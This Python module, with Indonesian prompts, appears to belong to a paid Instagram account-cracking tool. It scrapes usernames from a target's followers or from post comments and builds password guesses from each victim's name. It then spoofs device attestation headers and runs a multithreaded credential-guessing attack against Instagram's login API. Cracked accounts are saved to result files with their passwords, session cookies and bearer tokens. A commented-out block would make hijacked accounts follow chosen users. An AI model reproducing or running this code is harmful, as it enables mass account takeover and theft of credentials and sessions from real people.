import requests, json, re, uuid, time, random, datetime, pytz, os
from concurrent.futures import ThreadPoolExecutor

from .kynaa import Kyanaraaa
from yxdfb.Module import Tod
from bluid.getd import Yntks
from bluid.data import UserAgent

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
R = "\x1b[0;31m" # Merah

class Dump:

    def __init__(self, lim, asw, cok):
        self.uid_user = []
        self.dumpdata = []
        self.ok, self.cp, self.lop = 0, 0, 0
        self.cokie, self.lim, self.asw = cok, lim, asw
        self.config_login = {'mid': [], 'attp': []}


    def apcb(self, username):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cache-control': 'max-age=0', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)', 'viewport-width': '673'
                })
                awok = ses.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}").json()['data']['user']['id']
                return awok
            except:return None


    def media_id(self, posts_url):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'max-age=0', 'cookie':self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"', 
                    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.159", "Google Chrome";v="132.0.6834.159"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"6.8.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'viewport-width': '1105',

                })
                cccp = ses.get(posts_url).text
                ussr = re.search('{"media_id":"(.*?)"',str(cccp)).group(1)
                return ussr
            except AttributeError:return None


    def kyna(self,userid, next_pae, kynaa, apcb, trial):
        if len(self.dumpdata) >= trial:
            return
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0', 'viewport-width': '673'
                })
                data = {"query_hash": apcb,"variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                myid = ses.get('https://www.instagram.com/graphql/query/',params=data).json()
                for ussr in myid['data']['user'][f'{kynaa}']['edges']:
                    if len(self.dumpdata) >= trial:
                        break

                    cccp = ussr['node']['username']+'|'+ussr['node']['full_name'].replace('|','')
                    self.dumpdata.append(cccp)
                    print(f"\r[+] mengambil ({H}{len(self.dumpdata)}{N}) username. (Ctrl+C untuk berhenti)", end="", flush=True)
                
                if len(self.dumpdata) >= trial:
                    return

                if(myid['data']['user'][f'{kynaa}']['page_info']['has_next_page']==True):
                    self.kyna(userid, 
                         myid['data']['user'][kynaa]['page_info']['end_cursor'], 
                         kynaa, 
                         apcb, 
                         trial)
            except:
                return


    def komentar(self, media_id, min_cursor, trial):
        if len(self.dumpdata) >= trial:
            return
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cache-control': 'max-age=0', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)', 'viewport-width': '1358',
                })
                ussr = ses.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
                for usr in ussr['comments']:
                    if len(self.dumpdata) >= trial:
                        break

                    dat = usr['user']['username'] +'|'+ usr['user']['full_name']
                    if dat not in self.dumpdata: self.dumpdata.append(dat)
                    print(f"\r[+] mengambil ({H}{len(self.dumpdata)}{N}) username. (Ctrl+C untuk berhenti)", end="", flush=True)
                
                if len(self.dumpdata) >= trial:
                    return

                apc = ussr['next_min_id']
                self.komentar(media_id, apc, trial)
            except: return


    def balik(self):
        print(f"\n[{R}!{N}] gagal dump username.\n")
        while True:
            retry = input(f"[{H}?{N}] coba lagi (y/n): ").strip().lower()
            if retry == 'y':
                return
            elif retry == 'n':
                print("! keluar dari program.")
            else:
                print(f"\n[{R}!{N}] y/n blokk")
                continue


    def anakanjingkons(self, asw, asz):
        if "Trial" in self.lim:
            print(f"\n[{R}!{N}] anda adalah user trial, cuma bisa dump 1K username.")
            cccp = input(f"[{H}>{N}] masukan username: ").split(",")
            print()
            for ussr in cccp:
                uid = self.apcb(ussr)
                if(uid): self.uid_user.append(uid)
            if len(self.uid_user) == 0:self.balik()
            for userid in self.uid_user:
                self.kyna(userid, "", asz, asw, 1000)
                
            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print(f"[{H}✓{N}] berhasil mengambil ({H}{len(self.dumpdata)}{N}) username.")
                self.kombinasi_pw()
        else:
            print(f"\n[{H}*{N}] gunakan koma (,) jika ingin crack banyak username.")
            cccp = input(f"[{H}>{N}] masukan username: ").split(",")
            print()
            for ussr in cccp:
                uid = self.apcb(ussr)
                if(uid): self.uid_user.append(uid)
            if len(self.uid_user) == 0:self.balik()
            for userid in self.uid_user:
                self.kyna(userid, "", asz, asw, 100000000000000000000000)

            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print(f"[{H}✓{N}] berhasil mengambil ({H}{len(self.dumpdata)}{N}) username.")
                self.kombinasi_pw()


    def dump_koomentar(self):
        if "Trial" in self.lim:
            print(f"\n[{R}!{N}] anda adalah user trial, cuma bisa dump 1K username.")
            cccp = input(f"\n[{H}>{N}] masukan tautan: ")
            ussr = self.media_id(cccp)
            if ussr == None: return
            self.komentar(ussr, '', 1000)

            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print(f"[{H}✓{N}] berhasil mengambil ({H}{len(self.dumpdata)}{N}) username.")
                self.kombinasi_pw()
        else:
            print(f"\n[{H}*{N}] silahkan masukan URL postingan instagram.")
            cccp = input(f"\n[{H}>{N}] masukan tautan: ")
            ussr = self.media_id(cccp)
            if ussr == None: return
            self.komentar(ussr, '', 1000000000000000000)

            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print(f"[{H}✓{N}] berhasil mengambil ({H}{len(self.dumpdata)}{N}) username.")
                self.kombinasi_pw()


    def UserAgent(self):
        while True:
            print(f"\n[{H}1{N}] dump UserAgent\n[{H}2{N}] hapus UserAgent\n[{R}3{N}] kembali ke menu")
            fil = input("> ")
            if fil in ["1", "01"]:
                Yntks(self.asw, "data/cache/.sett_UaIG").pilihan()
            elif fil in ["2", "02"]:
                try:os.remove("data/cache/.sett_UaIG.json")
                except:pass
                print(f"\n[{H}✓{N}] berhasil menghapus UserAgent instagram")
                time.sleep(2);self.UserAgent()
            elif fil in ["3", "03"]:
                return
            else:
                print("! pilih yng bnr");time.sleep(1);self.UserAgent()

    def timezone_offset(self):
        try:
            tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
            ofs = tim.utcoffset().total_seconds() / 3600
            return str(ofs)
        except:
            return str(-time.timezone / 3600)


    def get_headers(self, barcelona=False):
        rawClient = str(int(time.time()))
        bloks = 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306' if barcelona else 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd'
        return {
        'x-ig-app-locale': 'in_ID',
        'x-ig-device-locale': 'in_ID',
        'x-ig-mapped-locale': 'id_ID',
        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
        'x-pigeon-rawclienttime': f'{rawClient}.503',
        'x-ig-bandwidth-speed-kbps': '-1.000',
        'x-ig-bandwidth-totalbytes-b': '0',
        'x-ig-bandwidth-totaltime-ms': '0',
        'x-bloks-version-id': bloks,
        'x-ig-www-claim': '0',
        'x-bloks-prism-button-version': 'CONTROL',
        'x-bloks-prism-indigo-link-version': '0',
        'x-bloks-prism-colors-enabled': 'false',
        'x-bloks-prism-ax-base-colors-enabled': 'false',
        'x-bloks-prism-font-enabled': 'false',
        'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"%s","signed_nonce":"","key_hash":""}]}' % (random.choice(self.config_login['attp'])),
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-device-id': 'ec76c649-d663-48f1-b6bb-bcadc556d340',
        'x-ig-family-device-id': '293c83cd-45d8-4ea9-956d-357f7c476be4',
        'x-ig-android-id': 'android-bc2b6bd10fb8fbe6',
        'x-ig-timezone-offset': self.timezone_offset(),
        'x-ig-nav-chain': f'com.bloks.www.caa.login.home_template:com.bloks.www.caa.login.home_template:1:button:{rawClient}.356::',
        'x-ig-client-endpoint': 'com.bloks.www.caa.login.home_template',
        'x-fb-connection-type': 'WIFI',
        'x-ig-connection-type': 'WIFI',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-app-id': '3419628305025917' if barcelona else '567067343352427',
        'priority': 'u=3',
        'user-agent': str(UserAgent().ua_instagram(barcelona).replace("Instagram", "Barcelona")) if barcelona else str(UserAgent().ua_instagram(barcelona)),
        'accept-language': 'id-ID, en-US',
        'x-mid': random.choice(self.config_login['mid']),
        'ig-intended-user-id': '0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept-encoding': 'gzip, deflate',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True',
    }


    def instagram_attestation(self):
        for _ in range(2):
            try:
                tete = 'app_scoped_device_id={}&key_hash=a7061a8c87792ea1a16093d8561b50d164af65bb2649018fd5d730f6d938d89b'.format(str(uuid.uuid1()))
                head = {
                'priority': 'u=3', 'user-agent': str(UserAgent().ua_instagram("")), 'x-ig-app-locale': 'in_ID', 'x-ig-device-locale': 'in_ID', 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-bandwidth-totaltime-ms': '0', 'x-bloks-version-id': 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306', 'x-ig-www-claim': '0', 'x-bloks-prism-button-version': 'CONTROL', 'x-bloks-prism-indigo-link-version': '0', 'x-ig-app-id': '3419628305025917', 'x-bloks-prism-colors-enabled': 'false', 'x-bloks-prism-ax-base-colors-enabled': 'false', 'x-bloks-prism-font-enabled': 'false', 'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}', 'x-bloks-is-layout-rtl': 'false', 'x-ig-device-id': 'ec76c649-d663-48f1-b6bb-bcadc556d340', 'x-ig-family-device-id': '293c83cd-45d8-4ea9-956d-357f7c476be4', 'ig-intended-user-id': '0', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'accept-encoding': 'gzip, deflate', 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True',
                }
                head.update({
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                'x-pigeon-rawclienttime': str(time.time())[:14],
                'x-ig-android-id': 'android-{}'.format(str(uuid.uuid4().hex)[:16]),
                })
                attp = requests.post('https://i.instagram.com/api/v1/attestation/create_android_keystore/', data=tete, headers=head)
                try:
                    mecanizeid = attp.headers['ig-set-x-mid']
                except:
                    mecanizeid = re.findall('mid=(.*?);', str(attp.headers))[0]
                changleNonce = attp.json()['challenge_nonce']
                self.config_login['mid'].append(mecanizeid)
                self.config_login['attp'].append(changleNonce)
            except Exception as e:
                print(e)
                continue


    def kombinasi_pw(self):
        self.instagram_attestation()
        print(f"\n[{H}>{N}] masukan pw tambahan\n[{H}>{N}] contoh: qwerty,123456")
        pw_tambahan = input("\n[?] password tambahan (opsional): ").split(",")

        user_agent_status = "UserAgent yang disetting" if os.path.exists("data/cache/.sett_UaIG.json") else "UserAgent bawaan script"
        print(f"[{H}#{N}] anda saat ini menggunakan {H}{user_agent_status}{N}")
        print("-" * 39 + f"\n[{H}+{N}] proses crack sedang di mulai.\n" + "-" * 39 + "\n")
        with ThreadPoolExecutor(max_workers=30) as executor:
            for user in self.dumpdata:
                try:
                    uid, nama = user.split('|')
                    nama = nama.lower().strip()
                except ValueError:
                    continue
                passwords = Kyanaraaa(self.asw).generate_passwords(nama, pw_tambahan)
                executor.submit(self.crack, uid, passwords)

        exit(f"\n\n[>] proses crack telah selesai")


    def print_proses(self, code):
        if code == 200:
            kyna = f"{H}200{N}"
        elif code == 400:
            kyna = f"{R}400{N}"
        elif code == 401:
            kyna = f"{R}401{N}"
        elif code == 403:
            kyna = f"{R}403{N}"
        elif code == 404:
            kyna = f"{R}404{N}"
        elif code == 429:
            kyna = f"{R}429{N}"
        elif code == 500:
            kyna = f"{R}500{N}"
        else:
            kyna = f"{R}{code}{N}"

        print(f"\r[{H}•{N}] [{kyna}] {str(self.lop)}/{len(self.dumpdata)} OK-:{H}{self.ok}{N} CP-:{R}{self.cp}{N}  ", end="")


    def crack(self, user, pasw):
        ses = requests.Session()
        for pw in pasw:
            try:
                smartCONFIG = {
                    'android_id': 'android-{}'.format(Kyanaraaa(self.asw).Android_ID(user,pw)[:16]),
                    'family': str(uuid.uuid4()),
                    'device': str(uuid.uuid4()),
                    'wartefall': str(uuid.uuid4()),
                    'request_ts': str(time.time()),
                    'ps': str(uuid.uuid4())
                }
                smartheaders = self.get_headers(False)
                user_agenttt = UserAgent().ua_instagram("")
                smartheaders.update({
                    'x-pigeon-rawclienttime': smartCONFIG['request_ts'][:14],
                    'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 20000)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(100000, 1000000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500, 2000)),
                    'x-ig-device-id': smartCONFIG['device'],
                    'x-ig-family-device-id': smartCONFIG['family'],
                    'x-ig-android-id': smartCONFIG['android_id'],
                    'user-agent': user_agenttt
                })
                SmartData = {
                    'params': '{"client_input_params":{"device_id":"'+ smartCONFIG['android_id'] +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(user)+'","machine_id":"'+str(smartheaders['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(user)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":null,"login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                    'bk_client_context': '{"bloks_version":"'+smartheaders['x-bloks-version-id']+'","styles_id":"instagram"}',
                    'bloks_versioning_id': smartheaders['x-bloks-version-id']
                }
                kyna = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',data=SmartData, headers=smartheaders)
                self.print_proses(kyna.status_code)
                if 'logged_in_user' in str(kyna.text.replace('\\','')):
                    self.ok += 1
                    try:
                        bearer = re.search('"Bearer IGT:2:(.*?)"', kyna.text.replace('\\','')).group(1)
                        cokies = 'mid=%s;'% smartheaders['x-mid'] + Kyanaraaa(self.asw).CookieBearer(bearer)
                        kontol = Kyanaraaa(self.asw).friends_user(cokies)
                        #ussr = {'accept': '*/*','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+re.search(r'sessionid=(.*?);',str(cokies)).group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
                        #ses.post("https://i.instagram.com/api/v1/web/friendships/39431798677/follow/", headers=ussr);ses.post("https://i.instagram.com/api/v1/web/friendships/28894072125/follow/", headers=ussr)
                        if 'memek' in str(kontol):kontol = Kyanaraaa(self.asw).friends_user_chek(user)
                    except:
                        kontol = ("", "")
                        cokies = ""

                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{kontol[0]}|{kontol[1]}|{cokies}{N}")
                    result_data = f"{user}|{pw}|{kontol[0]}|{kontol[1]}|{cokies}|{user_agenttt}"
                    Kyanaraaa(self.asw).save_hasil(f"data/results/OK/OK-{Tod().tggl()}.txt", result_data)
                    break
                elif 'https://i.instagram.com/challenge/' in str(kyna.text.replace('\\','')):
                    self.cp += 1
                    memek = Kyanaraaa(self.asw).friends_user_chek(user)
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}|{memek[0]}|{memek[1]}{N}")
                    result_data = f"{user}|{pw}|{memek[0]}|{memek[1]}"
                    Kyanaraaa(self.asw).save_hasil(f"data/results/CP/CP-{Tod().tggl()}.txt", result_data)
                    break
                elif 'redirect_login_challenges' in str(kyna.text.replace('\\','')):
                    self.cp += 1
                    memek = Kyanaraaa(self.asw).friends_user_chek(user)
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}|{memek[0]}|{memek[1]}{N}")
                    result_data = f"{user}|{pw}|{memek[0]}|{memek[1]}"
                    Kyanaraaa(self.asw).save_hasil(f"data/results/CP/CP-{Tod().tggl()}.txt", result_data)
                    break
            except (requests.exceptions.ConnectionError):
                time.sleep(30)
                self.crack(user, [pw])

        self.lop+=1